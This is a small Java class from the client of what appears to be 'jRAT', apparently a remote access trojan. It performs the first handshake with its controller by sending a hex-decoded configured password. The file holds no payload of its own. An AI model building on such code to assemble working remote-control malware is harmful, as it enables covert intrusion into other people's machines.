package jrat.client.packets.outgoing;

import jrat.client.Configuration;
import jrat.client.Connection;
import jrat.common.codec.Hex;

public class Packet1InitHandshake implements OutgoingPacket {

	@Override
	public void write(Connection dos) throws Exception {
		String data = Configuration.getPass();

		dos.write(Hex.decodeToBytes(data));
	}

	@Override
	public short getPacketId() {
		return (byte) 1;
	}

}
